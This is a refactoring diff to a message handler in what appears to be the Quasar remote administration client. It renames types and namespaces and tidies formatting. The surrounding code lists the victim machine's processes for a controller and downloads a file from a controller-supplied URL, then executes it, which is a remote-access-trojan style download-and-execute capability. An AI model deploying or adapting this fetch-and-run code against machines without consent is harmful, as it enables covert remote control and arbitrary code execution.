@@ -1,10 +1,6 @@
-﻿using Quasar.Client.Networking;
+﻿using Quasar.Client;
 using Quasar.Client.Setup;
 using Quasar.Common;
-using Quasar.Common.Enums;
-using Quasar.Common.Helpers;
-using Quasar.Common.Messages;
-using Quasar.Common.Networking;
 using System;
 using System.ComponentModel;
 using System.Diagnostics;
@@ -30,7 +26,7 @@ namespace Quasar.Client.Messages
             _webClient.DownloadFileCompleted += OnDownloadFileCompleted;
         }
 
-        private void OnClientStateChange(Networking.Client s, bool connected)
+        private void OnClientStateChange(Client s, bool connected)
         {
             if (!connected)
             {
@@ -64,11 +60,11 @@ namespace Quasar.Client.Messages
         private void Execute(ISender client, GetProcesses message)
         {
             Process[] pList = Process.GetProcesses();
-            var processes = new Common.Models.Process[pList.Length];
+            var processes = new QuasarProcess[pList.Length];
 
             for (int i = 0; i < pList.Length; i++)
             {
-                var process = new Common.Models.Process
+                var process = new QuasarProcess
                 {
                     Name = pList[i].ProcessName + ".exe",
                     Id = pList[i].Id,
@@ -87,7 +83,7 @@ namespace Quasar.Client.Messages
                 // download and then execute
                 if (string.IsNullOrEmpty(message.DownloadUrl))
                 {
-                    client.Send(new DoProcessResponse {Action = ProcessAction.Start, Result = false});
+                    client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                     return;
                 }
 
@@ -108,8 +104,8 @@ namespace Quasar.Client.Messages
                 }
                 catch
                 {
-                    client.Send(new DoProcessResponse {Action = ProcessAction.Start, Result = false});
-                    NativeMethods.DeleteFile(message.FilePath);
+                    client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
+                    Win32.DeleteFile(message.FilePath);
                 }
             }
             else
@@ -121,10 +117,10 @@ namespace Quasar.Client.Messages
 
         private void OnDownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
         {
-            var message = (DoProcessStart) e.UserState;
+            var message = (DoProcessStart)e.UserState;
             if (e.Cancelled)
             {
-                NativeMethods.DeleteFile(message.FilePath);
+                Win32.DeleteFile(message.FilePath);
                 return;
             }
 
@@ -144,7 +140,7 @@ namespace Quasar.Client.Messages
                 }
                 catch (Exception ex)
                 {
-                    NativeMethods.DeleteFile(filePath);
+                    Win32.DeleteFile(filePath);
                     _client.Send(new SetStatus { Message = $"Update failed: {ex.Message}" });
                 }
             }
